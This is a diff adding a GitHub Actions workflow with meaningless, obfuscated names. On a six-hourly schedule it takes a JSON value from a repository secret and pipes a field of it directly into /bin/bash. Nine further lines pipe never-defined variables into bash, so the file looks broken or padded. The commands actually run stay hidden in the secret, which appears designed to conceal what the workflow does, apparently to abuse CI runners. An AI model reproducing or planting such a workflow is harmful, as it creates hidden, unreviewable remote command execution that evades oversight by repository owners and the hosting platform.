@@ -1,0 +1,26 @@
+name: yuantuimk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuantuimk
+        env:
+          pmtyw2873: ${{ secrets.pmtyw2873 }}
+        run: |
+          echo $pmtyw2873 | jq -r .dxot1722 | /bin/bash
+          echo $jt90887 | jq -r .m2676 | /bin/bash
+          echo $sey072 | jq -r .uq2110 | /bin/bash
+          echo $n0 | jq -r .qepbt39 | /bin/bash
+          echo $lbul8718 | jq -r .pjn53 | /bin/bash
+          echo $m92 | jq -r .ckfc786 | /bin/bash
+          echo $o25 | jq -r .gje02415 | /bin/bash
+          echo $qg51 | jq -r .usla02205 | /bin/bash
+          echo $sjfm0 | jq -r .dyjyf56 | /bin/bash
+          echo $jmsf20 | jq -r .nucm6944 | /bin/bash
+
